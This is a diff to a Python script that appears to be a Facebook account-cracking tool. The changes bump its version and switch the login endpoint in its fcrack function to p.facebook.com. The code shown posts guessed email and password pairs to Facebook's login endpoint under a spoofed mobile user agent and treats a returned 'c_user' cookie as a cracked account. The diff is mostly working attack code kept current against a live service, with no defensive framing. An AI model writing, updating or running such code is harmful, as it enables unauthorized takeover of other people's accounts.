@@ -1099,7 +1099,7 @@ logo = """
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.3, \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.4 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1467,7 +1467,7 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb =  {'authority': 'm.alpha.facebook.com',
+            header_freefb =  {'authority': 'p.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -1482,7 +1482,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
